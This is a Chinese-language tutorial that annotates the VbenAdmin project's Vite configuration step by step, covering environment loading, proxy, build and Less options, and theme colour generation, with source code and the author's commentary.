檢查dir下是否有formats中的路徑，返回有就返迴路徑或者文件 function lookupFile(dir, formats, pathOnly = false) { for (const format of formats) { // ↓ 輸出dir和formats連接後的路徑 const fullPath = path__default.join(dir, format); // ↓ 同步的檢查該路徑是否存在，並且該路徑對應的是一個文件 if (fs__default.existsSync(fullPath) \u0026amp;\u0026amp; fs__default.statSync(fullPath).isFile()) { // ↓ 是否只要輸出路徑，否則輸出文件 return pathOnly ? fullPath : fs__default.readFileSync(fullPath, \u0026#39;utf-8\u0026#39;); } } // ↓ 上面的路徑都不滿足輸出條件，那麼再檢查一遍檢查傳入的dir的目錄名 const parentDir = path__default.dirname(dir); if (parentDir !== dir) { return lookupFile(parentDir, formats, pathOnly); } } 代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // 從傳參的root目錄下獲取 // 按順序 .env.${mode}.local、.env.${mode}、.env.local、.env這四個環境文件 // 輸出文件內配置的對象 function loadEnv(mode, root, prefix = \u0026#39;VITE_\u0026#39;) { if (mode === \u0026#39;local\u0026#39;) { // ↓ 如果第一個參數傳入\u0026#39;local\u0026#39;，就報錯： // ↓ \u0026#34;local \u0026#34;不能用作模式名稱，因為它與``.env文件的.local後綴衝突。 throw new Error(`\u0026#34;local\u0026#34; cannot be used as a mode name because it conflicts with ` + `the .local postfix for .env files.`); } // ↓ 待輸出的環境變量對象 const env = {}; // ↓ 要讀取的四個文件名稱的字符串數組 const envFiles = [ /** mode local file */ `.env.${mode}.local`, /** mode file */ `.env.${mode}`, /** local file */ `.env.local`, /** default file */ `.env` ]; // ↓ 檢查是否有實際的以VITE_*開頭的環境變量。 // ↓ 這些通常是Node內聯提供的env對象，並應優先考慮。 for (const key in process.env) { if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = process.env[key]; } } for (const file of envFiles) { // ↓ 檢查根目錄下是否有指定配置文件 const path = lookupFile(root, [file], true); if (path) { // ↓ 以換行為單位輸出文件中KEY=VAL格式的到結果對像中 const parsed = main$2.parse(fs__default.readFileSync(path), { debug: !!process.env.DEBUG || undefined }); // ↓ 讓環境變量互相使用，這個方法我沒仔細研究。不是很懂 main$1({ parsed, // ↓ 防止process.env修改 ignoreProcessEnv: true }); // ↓ 只輸出以prefix開頭的key for (const [key, value] of Object.entries(parsed)) { // ↓ 只有這個key在前面沒有加載過才賦值 if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = value; } else if (key === \u0026#39;NODE_ENV\u0026#39;) { // ↓ 在.env文件中覆蓋NODE_ENV。 process.env.VITE_USER_NODE_ENV = value; } } } } return env; } Vben中的wrapperEnv方法 說明 1 2 // The boolean type read by loadEnv is a string. This function can be converted to boolean type const viteEnv = wrapperEnv(env); 翻譯如下：\nloadEnv讀取的布爾類型是一個字符串。該函數可以轉換為布爾類型。\n創建wrapperEnv方法 從這開始涉及到根目錄下的build文件夾了。創建該文件夾。我們使用build文件夾裝所有關於項目構建類的東西。\n創建定義文件 根目錄下的build文件夾創建typeing.d.ts文件。\ntypeing.d.ts 1 2 3 4 5 6 declare module \u0026#39;*.json\u0026#39; { const src: any; export default src; } declare type Recordable = Record\u0026lt;string, any\u0026gt;; 參考連結 TS通用模塊聲明 TS的高級類型Record 允許導入Json這段代碼，寫在哪都行。 TS都會加載到。 定義Env對像類型 根目錄下的build文件夾創建utils.ts文件。\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export interface ViteEnv { VITE_PORT: number VITE_USE_MOCK: boolean VITE_USE_PWA: boolean VITE_PUBLIC_PATH: string VITE_PROXY: [string, string][] VITE_GLOB_APP_TITLE: string VITE_GLOB_APP_SHORT_NAME: string VITE_USE_CDN: boolean VITE_DROP_CONSOLE: boolean VITE_BUILD_COMPRESS: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39; VITE_LEGACY: boolean VITE_USE_IMAGEMIN: boolean } 導出的這個類型對應了我們配置文件中的Key。\n格式化Env對象的wrapperEnv方法 在utils.ts文件中添加以下方法：\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export function wrapperEnv(envConf: Recordable): ViteEnv { const ret: any = {}; for (const envName of Object.keys(envConf)) { let realName = envConf[envName].replace(/\\\\n/g, \u0026#39;\\n\u0026#39;); realName = realName === \u0026#39;true\u0026#39; ? true : realName === \u0026#39;false\u0026#39; ? false : realName; if (envName === \u0026#39;VITE_PORT\u0026#39;) { realName = Number(realName); } if (envName === \u0026#39;VITE_PROXY\u0026#39;) { try { realName = JSON.parse(realName); } catch (error) {} } ret[envName] = realName; process.env[envName] = realName; } return ret; } 代碼說明： 中間的正則替換就是將\\\\n替換成\\n，複製下面這些代碼可以去瀏覽器中體驗一下。 console.log('asda\\\\\\n\\\\n\\n'.replace(/\\n/g, '\\n')) =\u0026gt; asda\\ [回車\\n] \\n [回車\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\n/g, '\\n')) =\u0026gt; asda\\ [回車\\n] [回車\\n] [回車\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\\\n/g, '\\n')) =\u0026gt; asda [回車\\n] \\n [回車\\n] vite.config.ts文件復盤 自此vite.config.ts，除return裡面的東西外，其他的都已經解析完了。以現在可以得到這樣一個代碼：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { resolve } from \u0026#39;path\u0026#39;; import { ConfigEnv, loadEnv, UserConfig } from \u0026#39;vite\u0026#39;; import { wrapperEnv } from \u0026#39;./build/util\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd(); const env = loadEnv(mode, root); const viteEnv = wrapperEnv(env); const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; const isBuild = command === \u0026#39;build\u0026#39;; return {}; }; Vite配置-base 說明 Vite配置-base說明\n官網原文：\n類型： string 默認： / 開發或生產環境服務的 公共基礎路徑。合法的值包括以下幾種：\n絕對 URL 路徑名，例如 /foo/ 完整的 URL，例如 https://foo.com/ 空字符串或 ./（用於開發環境） 更多信息詳見公共基礎路徑。\n就是你的項目的BaseURL。比如這裡我配置一個yiu\n那麼我的項目訪問：http://localhost:3000/yiu/\n當你訪問其他路徑就會報錯：http://localhost:3000/any/\n1 The server is configured with a public base URL of /yiu/ - did you mean to visit /yiu/any/ instead? Vite配置-root 說明 Vite配置-root說明\n官網原文：\n類型： string 默認： process.cwd() 項目根目錄（index.html 文件所在的位置）。可以是一個絕對路徑，或者一個相對於該配置文件本身的路徑。\n更多信息詳見項目根目錄。\n用來找index.html路徑的配置吧，亂寫啟動項目的時候會報錯。其他的也不用解釋了。\nVite配置-resolve.alias 說明 Vite配置-resolve.alias說明\n官網原文：\n類型： 1 Record\u0026lt;string, string\u0026gt; | Array\u0026lt;{ find: string | RegExp, replacement: string }\u0026gt; 將會被傳遞到 @rollup/plugin-alias 作為它的 entries。也可以是一個對象，或一個 { find, replacement } 的數組。\n當使用文件系統路徑的別名時，請始終使用絕對路徑。相對路徑作別名值將按原樣使用導致不會解析到文件系統路徑中。\n更高級的自定義解析方法可以通過 插件 實現。\nVbenAdmin的示例： vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39;, }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39;, }, ], }, Vite配置-server.port 說明 Vite配置-server.port說明\n官網原文：\n類型： number 指定服務器端口。注意：如果端口已經被使用，Vite 會自動嘗試下一個可用的端口，所以這可能不是服務器最終監聽的實際端口。\nVite配置-server.proxy 說明 Vite配置-server.proxy說明 Vite內置的代理插件http-proxy的Git首頁 http-proxy的配置項 官網原文：\n類型： 1 Record\u0026lt;string, string | ProxyOptions\u0026gt; 為開發服務器配置自定義代理規則。期望接收一個 { key: options } 對象。如果 key 值以 ^ 開頭，將會被解釋為 RegExp。\n使用 http-proxy。完整選項詳見 此處。\n示例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default { server: { proxy: { // 字符串簡寫寫法 \u0026#39;/foo\u0026#39;: \u0026#39;http://localhost:4567/foo\u0026#39;, // 選項寫法 \u0026#39;/api\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/api/, \u0026#39;\u0026#39;) }, // 正則表達式寫法 \u0026#39;^/fallback/.*\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/fallback/, \u0026#39;\u0026#39;) } } } } VbenAdmin代碼解析 我們在build文件夾下創建一個vite文件，這麼放置所有和vite配置有關的文件。然後完成本章兩個文件的編寫。\nproxy.ts build\\vite\\proxy.ts，注意，這裡帶註解的代碼和原代碼不一樣。因為原代碼我感覺有點問題。\nVite官方文檔說代理配置接收的是一個Record\u0026lt;string, string | ProxyOptions\u0026gt;對象。而這個文件的主要方法返回的是ProxyTargetList類型的對象。\n按理來說ProxyTargetList應該直接等於Record\u0026lt;string, string | ProxyOptions\u0026gt;。\n但是VbenAmin的代碼安裝了一個@types/http-proxy（雖然Vite本身的代理就是用http-proxy實現的）的開發依賴。然後從這個開發依賴裡面導入一個ServerOptions。讓ProxyTargetList等於Record\u0026lt;string, ServerOptions \u0026amp; { rewrite: (path: string) =\u0026gt; string }\u0026gt;。\n個人感覺可以直接使用vite提供的類型即可，不用安裝@types/http-proxy的聲明文件。\n代碼 被代理之後，訪問的路徑是 代理至的路徑 + 訪問的路徑去掉根路徑後經過rewrite處理的路徑。\nbuild/vite/proxy.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * .env.development 的 代理配置 */ import type { ProxyOptions } from \u0026#39;vite\u0026#39;; // ↓ 第一项被代理的路径，第二项代理至的路径 type ProxyItem = [string, string]; // ↓ 方法接收的参数 type ProxyList = ProxyItem[]; // ↓ Vite代理所接收对象类型 type ProxyTargetList = Record\u0026lt;string, string | ProxyOptions\u0026gt;; // ↓ https类型的URL的匹配正则 const httpsRE = /^https:\\/\\//; /** * 生成Vite代理配置的方法 */ export function createProxy(list: ProxyList = []) { const ret: ProxyTargetList = {}; for (const [prefix, target] of list) { const isHttps = httpsRE.test(target); // https://github.com/http-party/node-http-proxy#options ret[prefix] = { // ↓ 代理至的路径 target: target, // ↓ 默认值：false-将主机标头的来源更改为目标URL changeOrigin: true, // ↓ 如果您想代理websocket ws: true, rewrite: (path) =\u0026gt; path.replace(new RegExp(`^${prefix}`), \u0026#39;\u0026#39;), // https is require secure=false ...(isHttps ? { secure: false } : {}), }; } return ret; } vite.config.ts 直接將上面定義的生成代理配置的方法放到vite.config.ts中使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ... import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... server: { // ... // 從.env加載代理配置 proxy: createProxy(VITE_PROXY), }, // ... }; }; Vite配置-server.hmr 說明 Vite配置-server.hmr說明\n官網原文：\n類型： 1 boolean | { protocol?: string, host?: string, port?: number, path?: string, timeout?: number, overlay?: boolean } 禁用或配置 HMR 連接（用於 HMR websocket 必須使用不同的 http 服務器地址的情況）。\n設置 server.hmr.overlay 為 false 可以禁用服務器錯誤遮罩層。\n這個就是配置Vite的熱更新的。文檔中說的服務器錯誤遮罩層，就是你在代碼中編寫編寫錯誤的代碼，編譯不通過的時候，瀏覽器頁面也會同時展示一個灰屏上面顯示你的代碼錯誤。\nVite配置-build.minify 說明 Vite配置-build.minify說明\n官網原文：\n類型： 1 boolean | \u0026#39;terser\u0026#39; | \u0026#39;esbuild\u0026#39; 默認：terser 設置為 false 可以禁用最小化混淆，或是用來指定使用哪種混淆器。默認為 Terser，雖然 Terser 相對較慢，但大多數情況下構建後的文件體積更小。 ESbuild 最小化混淆更快但構建後的文件相對更大。\nVite配置-build.outDir 說明 Vite配置-build.outDir說明\n官網原文：\n類型：string 默認：dist 指定輸出路徑（相對於 項目根目錄)。\n創建全局常數 這個輸出路徑我們把它寫成一個全局常量。全局常量保存在：build\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * 在生产环境中输入的配置文件名称。 */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; 然後在vite.config.ts中引用：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Vite配置-build.polyfillDynamicImport 說明 Vite配置-build.polyfillDynamicImport說明 擁抱Vite2.0 系列（二） - 知乎 官網原文：\n類型：boolean 默認：true，除非build.target是esnext。 是否自動注入動態導入polyfill。\npolyfill會自動注入到每個index.html條目的代理模塊中。如果通過build.rollupOptions.input配置成使用非html的自定義條目，那麼就需要手動導入自定義條目中的polyfill：\n1 import \u0026#39;vite/dynamic-import-polyfill\u0026#39; 注意：polyfill不適用於庫模式。如果你需要支持沒有本地動態導入的瀏覽器，你可能應該避免在你的庫中使用它。\nVite使用ES動態導入作為代碼分割點。生成的代碼還將使用動態導入來加載異步塊。然而，本機ESM動態導入支持是在ESM之後通過腳本標記實現的，並且這兩個特性在瀏覽器支持方面存在差異。 Vite會自動注入一個輕量級的動態導入填充來消除這種差異。\n如果你知道你的目標瀏覽器只支持本機動態導入，你可以通過build.polyfillDynamicImport顯式禁用此特性。\n總之VbenAdmin中在生產環境將此項禁用了。如果打包後的項目有問題，而本地運行沒問題。那麼嘗試打開它，因為這個配置貌似和瀏覽器有關。\n創建全局常數 這個輸出路徑我們把它寫成一個全局常量。全局常量保存在：build\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * 在生产环境中输入的配置文件名称。 */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; 然後在vite.config.ts中引用：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Vite配置-build.terserOptions 說明 Vite配置-build.terserOptions說明\n官網原文：\n類型：TerserOptions 傳遞給 Terser 的更多 minify 選項。\n其他的配置項自行研究，這裡只註釋一下VbenAdmin配置的代碼。\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { // ... terserOptions: { compress: { keep_infinity: true, // 用於刪除生產環境中的console drop_console: VITE_DROP_CONSOLE, }, }, }, // ... }; }; compress：（默認{}）-通過false以完全跳過壓縮。傳遞一個對像以指定自定義壓縮選項。 compress.keep_infinity：（默認值：false）-通過true以防止Infinity被壓縮為1/0，這可能會導致Chrome出現性能問題。 compress.drop_console：（默認值：false）-傳遞true以放棄對console.*函數的調用 。如果您希望在刪除函數調用後刪除特定的函數調用，例如console.info和/或保留函數自變量的副作用，請pure_funcs改用。 Vite配置-build.brotliSize 說明 Vite配置-build.brotliSize說明\n官網原文：\n類型：boolean 默認：true 啟用/禁用 brotli 壓縮大小報告。壓縮大型輸出文件可能會很慢，因此禁用該功能可能會提高大型項目的構建性能。\n禁用就好。\n效果對比 打開壓縮報告：4.90s\n關閉壓縮報告：3.50s，少了後面一串壓縮大小，肯定更快啦。\nVite配置-build.chunkSizeWarningLimit 說明 Vite配置-build.chunkSizeWarningLimit說明\n官網原文：\n類型：number 默認：500 chunk 大小警告的限制（以 kbs 為單位）。\nLimitChunkCountPlugin\n在編寫代碼時，您可能已經添加了許多代碼拆分點以按需加載內容。編譯後，您可能會注意到一些塊太小了-造成更大的HTTP開銷。 LimitChunkCountPlugin可以通過合併來對您的塊進行後處理。\nVite配置-define 說明 Vite配置-define說明\n官網原文：\n類型： 1 Record\u0026lt;string, string\u0026gt; 定義全局變量替換方式。每項在開發時會被定義為全局變量，而在構建時則是靜態替換。\n從 2.0.0-beta.70 版本開始，字符串值將作為一個直接的表達式，所以如果定義為了一個字符串常量，它需要被顯式地引用（例如：通過 JSON.stringify）。 替換只會在匹配到周圍是單詞邊界（\\b）時執行。 使用 看一下vue-i18n的應用。\nvue-i18n的全局變量替換\n原文：\nBundler 構建功能標誌\nesm-bundler builds現在暴露了全局特性標誌，這些標誌可以在編譯時被覆蓋。\n__VUE_I18N_FULL_INSTALL__：啟用/禁用，除了vue-i18n APIs，組件和指令都完全支持安裝：true\n__VUE_I18N_LEGACY_API__：啟用/禁用vue-i18n傳統風格的API支持，默認為true\n__INTLIFY_PROD_DEVTOOLS__：在生產中啟用/禁用intlify-devtools和vue-devtools支持，默認為false\n在沒有配置這些標誌的情況下，編譯也能正常工作，但強烈建議正確配置這些標誌，以便在最終的bundle中獲得正確的樹形搖動。\n要配置這些標誌：\nwebpack: 使用 DefinePlugin Rollup: 使用 @rollup/plugin-replace Vite：默認配置，但可以使用define選項覆蓋 注意：替換值必須是布爾文，不能是字符串，否則bundler/minifier將無法正確評估條件。\n如此，就按照VbenAdmin的原代碼一樣配置吧。不然vue-i18n還會包警告，當然，現在我們還沒有安裝vue-i18n。後面配置國際化的時候再講。\nVite配置-css.preprocessorOptions 說明 Vite配置-css.preprocessorOptions說明\n官網原文：\n類型： 1 Record\u0026lt;string, object\u0026gt; 指定傳遞給 CSS 預處理器的選項。例如：\nvite.config.ts 1 2 3 4 5 6 7 8 9 export default { css: { preprocessorOptions: { scss: { additionalData: `$injectedColor: orange;` } } } } 安裝less 眾所周知Antd框架使用的是less。所以我們這裡研究less的配置。\n安裝less：\n1 yarn add less --dev VbenAdmin的全局樣式 在根目錄下的：src\\design文件夾中定義了VbenAdmin所有 全局樣式 和 全局less變量 。其中分為兩大類：\nsrc\\design\\index.less：全局樣式，在main.ts中使用。 src\\design\\config.less：全局變量，在vite.config.ts中使用。 至於該文件夾下的其他文件，都被直接或間接的引入到了index.less、config.less中。\n我們這邊直接拷貝文件夾就行了，樣式也沒啥研究的。如果有能力的可以把和index.less相關的文件都刪除了，然後自己寫關於VbenAdmin的樣式。\n但是變量不能動，很多都antd的變量，antd 的 less 變量參考連結。\n複製完之後，順便將index.less在main.ts中引用一下。\nVite中的Less配置 代碼配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // 用於全局導入，以避免需要單獨導入每個樣式文件。 // reference: 避免重複引用 hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // ↓ 這行代碼下一章講 // ...generateModifyVars(), }, javascriptEnabled: true, }, }, }, // ... }; }; 代碼解析 less-@import規則 less-命令行語法 lessjs-配置項 lessjs-配置項-javascriptEnabled \u0026amp; modifyVars less-reference外文博客 css hack匯總 史上最全的CSS hack方式一覽 關於Less js的@import實驗 less對應的對象可以查看lessjs-配置項。\njavascriptEnabled: true這行代碼沒得說，畢竟antd的less文件中使用JS寫法，比如：\\node_modules\\ant-design-vue\\lib\\style\\color\\bezierEasing.less modifyVars是在全局less文件後面添加變量的配置。 modifyVars對應的對象屬性名會加上@追加到less文件後。 hack: true; @import (r...：這一行代碼，在less文件中會被解析成： 1 @hack=true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;; 那這個hack變量是幹什麼的？我感覺啥也沒有，單純是為了將後面的@import接上的@import會報錯，只寫。這行代碼可以隨便寫，比如：\n1 2 3 // yiu: `red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // ↓ 解析成,一樣的效果。 @yiu=red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, 我個人感覺這個hack和css hack單純名字一樣。至於reference，可以看一下關於Less js的@import實驗這篇博文即可理解。只是我個人疑惑為什麼這個import為什麼不寫在globalVars中。\nVite的顏色 說明 解析build\\config\\themeConfig.ts文件，直接創建這個文件。然後我們一段一段的分析：\n1 yarn add ant-design-vue@next 第一部分3-16行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // ↓ 默認顏色 export const primaryColor = \u0026#39;#0960bd\u0026#39;; // ↓ 默認主題 export const themeMode = \u0026#39;light\u0026#39;; // ↓ 主題類型 export type ThemeMode = \u0026#39;dark\u0026#39; | \u0026#39;light\u0026#39;; // ↓ 一個解決臨時檢查的方法類型 type Fn = (...arg: any) =\u0026gt; any; // ↓ Vite生成顏色組的方法參數，顏色這一塊有點深奧了，不做細的研究，感興趣的同學自己看看源碼吧 export interface GenerateColorsParams { mixLighten: Fn; mixDarken: Fn; tinycolor: any; color?: string; } 第二部分18-22行代碼 1 2 3 4 5 6 7 import { generate } from \u0026#39;@ant-design/colors\u0026#39;; export function generateAntColors(color: string, mode: ThemeMode) { return generate(color, { theme: mode == \u0026#39;dark\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;default\u0026#39;, }); } 調用的@ant-design/colors的顏色生成方法，將參數簡化了一下。\n參考連結：\n@ant-design/colors的npm首頁 Ant Design Colors首頁 Ant Design 色板生成算法演進之路 第三部分24-32行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 export function getThemeColors(color?: string, theme?: ThemeMode) { const tc = color || primaryColor; const tm = theme || themeMode; // ↓ 傳入的顏色根據主題生成10個顏色系列 const colors = generateAntColors(tc, tm); // ↓ 取10個顏色的第6個作為主顏色 const primary = colors[5]; // ↓ 再使用主顏色根據主題生成10個顏色系列 const modeColors = generateAntColors(primary, tm === \u0026#39;dark\u0026#39; ? \u0026#39;light\u0026#39; : \u0026#39;dark\u0026#39;); // ↓ 輸出這20個顏色 return [...colors, ...modeColors]; } 第四部分34-71行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 export function generateColors({ color = primaryColor, mixLighten, mixDarken, tinycolor, }: GenerateColorsParams) { const arr = new Array(19).fill(0); const lightens = arr.map((t, i) =\u0026gt; { return mixLighten(color, i / 5); }); const darkens = arr.map((t, i) =\u0026gt; { return mixDarken(color, i / 5); }); const alphaColors = arr.map((t, i) =\u0026gt; { return tinycolor(color) .setAlpha(i / 20) .toRgbString(); }); const tinycolorLightens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .lighten(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#ffffff\u0026#39;); const tinycolorDarkens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .darken(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#000000\u0026#39;); return [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]; } 這裡直接根據顏色生成了98中顏色。我確實不太清楚這個麼多顏色幹什麼的。調用效果參考build\\vite\\plugin\\theme.ts（現在先不管這個文件）：\nbuild/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); // ... } #0960bd生成的顏色：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 console.log([...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]); // ↓ 輸出 [ \u0026#39;#0960bd\u0026#39;, \u0026#39;#3a80ca\u0026#39;, \u0026#39;#6ba0d7\u0026#39;, \u0026#39;#9dbfe5\u0026#39;, \u0026#39;#cedff2\u0026#39;, \u0026#39;#ffffff\u0026#39;, \u0026#39;#13011f10c\u0026#39;, \u0026#39;#16113f119\u0026#39;, \u0026#39;#19315e127\u0026#39;, \u0026#39;#1c417e134\u0026#39;, \u0026#39;#1f519e141\u0026#39;, \u0026#39;#2261be14e\u0026#39;, \u0026#39;#2571de15b\u0026#39;, \u0026#39;#2891fd169\u0026#39;, \u0026#39;#2ba21d176\u0026#39;, \u0026#39;#2eb23d183\u0026#39;, \u0026#39;#31c25d190\u0026#39;, \u0026#39;#34d27d19d\u0026#39;, \u0026#39;#37f29c1ab\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#074d97\u0026#39;, \u0026#39;#053a71\u0026#39;, \u0026#39;#04264c\u0026#39;, \u0026#39;#021326\u0026#39;, \u0026#39;#000000\u0026#39;, \u0026#39;#-2-13-26\u0026#39;, \u0026#39;#-4-26-4c\u0026#39;, \u0026#39;#-5-3a-71\u0026#39;, \u0026#39;#-7-4d-97\u0026#39;, \u0026#39;#-9-60-bd\u0026#39;, \u0026#39;#-b-73-e3\u0026#39;, \u0026#39;#-d-86-109\u0026#39;, \u0026#39;#-e-9a-12e\u0026#39;, \u0026#39;#-10-ad-154\u0026#39;, \u0026#39;#-12-c0-17a\u0026#39;, \u0026#39;#-14-d3-1a0\u0026#39;, \u0026#39;#-16-e6-1c6\u0026#39;, \u0026#39;#-17-fa-1eb\u0026#39;, \u0026#39;rgba(9, 96, 189, 0)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.05)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.1)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.15)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.2)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.25)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.3)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.35)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.4)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.45)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.5)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.55)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.6)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.65)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.7)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.75)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.8)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.85)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.9)\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0854a5\u0026#39;, \u0026#39;#07478c\u0026#39;, \u0026#39;#063b74\u0026#39;, \u0026#39;#042f5c\u0026#39;, \u0026#39;#032243\u0026#39;, \u0026#39;#02162b\u0026#39;, \u0026#39;#010913\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0a6cd5\u0026#39;, \u0026#39;#0b79ee\u0026#39;, \u0026#39;#1e86f4\u0026#39;, \u0026#39;#3793f5\u0026#39;, \u0026#39;#4fa0f7\u0026#39;, \u0026#39;#67adf8\u0026#39;, \u0026#39;#80baf9\u0026#39;, \u0026#39;#98c7fa\u0026#39;, \u0026#39;#b0d4fb\u0026#39;, \u0026#39;#c9e2fc\u0026#39;, \u0026#39;#e1effe\u0026#39;, \u0026#39;#f9fcff\u0026#39; ] console.log( [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens].length ); // ↓ 輸出 78 第五部分73-104行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 /** * less global variable */ export function generateModifyVars() { const palettes = generateAntColors(primaryColor, themeMode); const primary = palettes[5]; const primaryColorObj: Record\u0026lt;string, string\u0026gt; = {}; for (let index = 0; index \u0026lt; 10; index++) { primaryColorObj[`primary-${index + 1}`] = palettes[index]; } return { \u0026#39;primary-color\u0026#39;: primary, ...primaryColorObj, \u0026#39;info-color\u0026#39;: primary, \u0026#39;processing-color\u0026#39;: primary, \u0026#39;success-color\u0026#39;: \u0026#39;#55D187\u0026#39;, // Success color \u0026#39;error-color\u0026#39;: \u0026#39;#ED6F6F\u0026#39;, // False color \u0026#39;warning-color\u0026#39;: \u0026#39;#EFBD47\u0026#39;, // Warning color \u0026#39;disabled-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.25)\u0026#39;, // Failure color \u0026#39;heading-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Title color 